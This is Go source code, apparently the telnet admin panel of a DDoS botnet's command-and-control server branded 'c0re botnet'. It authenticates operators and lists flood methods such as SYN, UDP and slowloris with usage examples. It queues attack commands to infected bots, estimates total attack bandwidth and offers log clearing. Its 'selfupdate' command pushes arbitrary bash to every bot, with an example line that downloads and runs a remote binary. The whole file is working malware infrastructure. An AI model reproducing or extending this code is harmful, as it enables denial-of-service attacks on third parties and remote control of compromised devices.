package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[1;33mUsername \033[1;37m> \033[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\033[1;33mPassword \033[1;37m> \033[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
	for i := 0; i < 15; i++ {
		this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
		this.conn.Write(append([]byte("\r\x1b[0;36m💫 \x1b[1;30m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(10) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\x1b[0;34mWrong credentials, try again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Printf("Failed to open log file: %v\n", err)
		}
		defer loginLogsOutput.Close()
	
		logEntry := fmt.Sprintf(
			"| SUCCESSFUL LOGIN | username:%s | password:%s | ip:%s |",
			username,
			password,
			this.conn.RemoteAddr().String(),
		)
		
		log.SetOutput(loginLogsOutput)
		log.Println(logEntry)
	}
	
	banner := "\033[1;31m" +
		"    ███████╗██████╗  ██████╗  ███████╗███████╗███████╗██████╗ \r\n" +
		"    ██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔══██╗\r\n" +
		"    ███████╗██████╔╝██║   ██║█████╗  █████╗  █████╗  ██║  ██║\r\n" +
		"    ╚════██║██╔═══╝ ██║   ██║██╔══╝  ██╔══╝  ██╔══╝  ██║  ██║\r\n" +
		"    ███████║██║     ╚██████╔╝███████╗██║     ███████╗██████╔╝\r\n" +
		"    ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═════╝ \r\n\r\n" +
		"    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗\r\n" +
		"    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝\r\n" +
		"    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   \r\n" +
		"    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   \r\n" +
		"    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   \r\n" +
		"    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   \r\n\r\n" +
		"\033[1;95m          ╔═══════════════════════════════════╗\r\n" +
		"\033[1;95m          ║  \033[1;97mc0re botnet + whyfucked  \033[1;95m║\r\n" +
		"\033[1;95m          ╚═══════════════════════════════════╝\033[0m\r\n\r\n"

	this.conn.Write([]byte(banner))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if userInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Spoofed ✨ :: %d bots :: %d users :: %d running atk :: %d sents\007", BotCount, database.fetchUsers(), database.fetchRunningAttacks(), database.fetchAttacks()))); err != nil {
					this.conn.Close()
					break
				}
			}
			if userInfo.admin == 0 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Spoofed :: %d bots :: %d running atk\007", BotCount, database.fetchRunningAttacks()))); err != nil {
					this.conn.Close()
					break
				}
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;38;5;51;48;5;236m  \x1b[1;38;5;231;48;5;236m" + username + "\x1b[1;38;5;203;48;5;236m 󰓇\x1b[1;31;48;5;236m Spoofed \x1b[1;38;5;198m\x1b[1;38;5;201m➤\x1b[1;95m➤ \x1b[0m"))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
	
			this.conn.Write([]byte("\r\x1b[38;5;51m" +
				"▗▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▖\r\n" +
				"\x1b[38;5;45m▌             \x1b[1;38;5;201mSPOOFED NETWORK\x1b[0;38;5;45m             ▐\r\n" +
				"\x1b[38;5;39m▌    \x1b[38;5;198mﮊ \x1b[38;5;204mKILLING ALL NETS WITH STYLE \x1b[38;5;198mﮊ\x1b[38;5;39m    ▐\r\n" +
				"\x1b[38;5;33m▝▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▘\x1b[0m\r\n\r\n"))
	
			statsPanel := fmt.Sprintf("\r\x1b[1;37m╔%s╗\r\n"+
				"\x1b[1;37m║ \x1b[38;5;51m  Online Users: \x1b[1;36m%-6d \x1b[38;5;198m│ \x1b[38;5;51m  Bots: \x1b[1;36m%-6d \x1b[1;37m║\r\n"+
				"\x1b[1;37m║ \x1b[38;5;51m  Active Attacks: \x1b[1;31m%-6d \x1b[38;5;198m│ \x1b[38;5;51m  Total Attacks: \x1b[1;31m%-6d \x1b[1;37m║\r\n"+
				"\x1b[1;37m╚%s╝\r\n\r\n",
				strings.Repeat("═", 47), 
				database.fetchUsers(), 
				clientList.Count(),
				database.fetchRunningAttacks(),
				database.fetchAttacks(),
				strings.Repeat("═", 47))
	
			this.conn.Write([]byte(statsPanel))
	
			this.conn.Write([]byte("\r\x1b[1;38;5;198m» \x1b[1;38;5;201mWELCOME TO THE \x1b[1;38;5;51mSPOOFED NETWORK \x1b[38;5;198m«\x1b[0m\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;111m  Type 'help' to see available commands \x1b[38;5;198m»»»\x1b[0m\r\n\r\n"))
		    continue
		}
		if cmd == "methods" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("│        c0re botnet - attack methods                          │\r\n"))
			this.conn.Write([]byte("├────── l4 udp ────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("│ udp, raw, nudp, udphex, cudp, slowudp, frag                  │\r\n"))
			this.conn.Write([]byte("├────── l4 tcp ────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("│ tcp, ack, syn, xmas, bypass, handshake, std, hex, stdhex     │\r\n"))
			this.conn.Write([]byte("│ slowloris, rsmedia, ovhtcp, tcp_handshake, conn_exhaust      │\r\n"))
			this.conn.Write([]byte("├────── special ───────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("│ socket - powerful legitimate tcp (full handshake + clean)    │\r\n"))
			this.conn.Write([]byte("├────── how to use ────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("│ ex: nudp 1.2.3.4 120 port=666                                │\r\n"))
			this.conn.Write([]byte("│ ex: slowloris 1.2.3.4 300 port=80                            │\r\n"))
			this.conn.Write([]byte("│ ex: socket 1.2.3.4 120 port=80 threads=64 size=1024          │\r\n"))
			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
			continue
		}

		if cmd == "help" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("│        spoofed network - help menu                          │\r\n"))
			this.conn.Write([]byte("├────── commands ──────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("│ help, count, methods, bots, stats, attacknet, stop         │\r\n"))
			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
			continue
		}
		if err != nil || cmd == "logout" || cmd == "LOGOUT" {
			return
		}

		if cmd == "count" { 
			const (
				colorLabel = "\x1b[1;37m"
				colorValue  = "\x1b[1;31m"
				colorReset  = "\033[0m"
				lineBreak   = "\r\n"
			)
		
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			var response bytes.Buffer
		
			for arch, count := range distribution {
				response.WriteString(fmt.Sprintf(
					"%s%s: %s%d%s%s%s",
					colorLabel,
					arch,
					colorValue,
					count,
					colorReset,
					lineBreak,
					colorReset,
				))
			}
		
			response.WriteString(fmt.Sprintf(
				"%sTotal botcount: %s%d%s%s%s",
				colorLabel,
				colorValue,
				botCount,
				colorReset,
				lineBreak,
				colorReset,
			))
		
			if _, err := this.conn.Write(response.Bytes()); err != nil {
				log.Printf("Ошибка отправки данных: %v", err)
			}
			
			continue
		}

		if cmd == "bots" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("│                    CONNECTED BOTS LIST                     │\r\n"))
			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
			
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			
			if botCount == 0 {
				this.conn.Write([]byte("│ No bots connected                                              │\r\n"))
			} else {
				for arch, count := range distribution {
					this.conn.Write([]byte(fmt.Sprintf("│ %-20s: %-10d bots                    │\r\n", arch, count)))
				}
			}
			
			this.conn.Write([]byte(fmt.Sprintf("├──────────────────────────────────────────────────────────────┤\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("│ Total: %-10d bots connected                        │\r\n", botCount)))
			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
			continue
		}

		if cmd == "stop" {
			this.conn.Write([]byte("Stopping all attacks...\r\n"))
			// отправляем kill команду всем ботам
			killCmd := []byte{0x00, 0x00, 0x03}
			clientList.QueueBuf(killCmd, -1, "")
			this.conn.Write([]byte("All attacks stopped\r\n"))
			continue
		}

		if cmd == "stats" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("│                    SPOOFED NETWORK STATS                    │\r\n"))
			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
			
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			activeAttacks := database.fetchRunningAttacks()
			totalAttacks := database.fetchAttacks()
			
			// статистика по архитектурам
			for arch, count := range distribution {
				this.conn.Write([]byte(fmt.Sprintf("│ %-20s: %-10d bots                    │\r\n", arch, count)))
			}
			
			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("│ Total Bots: %-10d                                │\r\n", botCount)))
			this.conn.Write([]byte(fmt.Sprintf("│ Active Attacks: %-10d                        │\r\n", activeAttacks)))
			this.conn.Write([]byte(fmt.Sprintf("│ Total Attacks: %-10d                         │\r\n", totalAttacks)))
			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
			continue
		}

		if cmd == "attacknet" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[1;31m┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("\x1b[1;31m│                    NETWORK ATTACK POWER                    │\r\n"))
			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
			
			botCount := clientList.Count()
			
			// расчет мощности сети
			avgPps := 50000 // средний pps на бота
			avgBandwidth := 100 // средний мбит/с на бота
			
			totalPps := botCount * avgPps
			totalBandwidth := botCount * avgBandwidth
			totalGbps := float64(totalBandwidth) / 1000.0
			
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bots:        \x1b[1;36m%-10d bots                    \x1b[1;31m│\r\n", botCount)))
			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mNetwork Power:     \x1b[1;32m%-10d PPS                     \x1b[1;31m│\r\n", totalPps)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bandwidth:   \x1b[1;32m%-10d Mbps                    \x1b[1;31m│\r\n", totalBandwidth)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bandwidth:   \x1b[1;32m%-10.2f Gbps                    \x1b[1;31m│\r\n", totalGbps)))
			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mActive Attacks:    \x1b[1;33m%-10d attacks                 \x1b[1;31m│\r\n", database.fetchRunningAttacks())))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Attacks:     \x1b[1;33m%-10d attacks                 \x1b[1;31m│\r\n", database.fetchAttacks())))
			this.conn.Write([]byte("\x1b[1;31m└──────────────────────────────────────────────────────────────┘\x1b[0m\r\n"))
			continue
		}
		
		if userInfo.admin == 1 && cmd == "adminhelp" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;208m┌──────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mSpoofed Network - Admin Commands    \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m├──────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminuser     Add new normal user     \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminadmin    Add new admin           \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminremove   Remove user             \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminlogs     Clear attack logs       \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mselfupdate    Execute bash script     \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mcount         Show bot count          \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mbots          List connected bots     \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstop          Stop all attacks        \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstats         Network statistics       \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mattacknet     Attack power stats      \x1b[38;5;208m│\r\n"))
			this.conn.Write([]byte("\x1b[38;5;208m└──────────────────────────────────────────────┘\r\n"))
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "adminadmin" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm(y): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create Admin! \r\n"))
			} else {
				this.conn.Write([]byte("Admin created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "adminlogs" {
			this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
			} else {
				this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "adminremove" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "adminuser" {
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37m%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
			}
			continue

		} 

		if userInfo.admin == 1 && strings.HasPrefix(cmd, "selfupdate ") {
			parts := strings.SplitN(cmd, " ", 2)
			if len(parts) < 2 {
				this.conn.Write([]byte("\x1b[1;31mUsage: selfupdate <bash_script>\r\n"))
				this.conn.Write([]byte("\x1b[1;33mExample: selfupdate cd /tmp && wget http://example.com/bot && chmod +x bot && ./bot\r\n"))
				continue
			}
			
			script := parts[1]
			if len(script) > 4096 {
				this.conn.Write([]byte("\x1b[1;31mScript too long (max 4096 bytes)\r\n"))
				continue
			}

			buf := make([]byte, 0, len(script)+10)
			buf = append(buf, 0x00, 0x00)
			buf = append(buf, 0x01)
			scriptLen := uint16(len(script))
			buf = append(buf, byte(scriptLen>>8), byte(scriptLen&0xFF))
			buf = append(buf, []byte(script)...)
			
			totalLen := uint16(len(buf) - 2)
			buf[0] = byte(totalLen >> 8)
			buf[1] = byte(totalLen & 0xFF)

			clientList.QueueBuf(buf, -1, "")
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mSelfupdate command sent to all bots (%d bytes)\r\n", len(script))))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s is not a valid command!\033[0m\r\n", cmd)))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mAttack sent to all bots\r\n")))
				} else {
					fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte("\b \b"))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}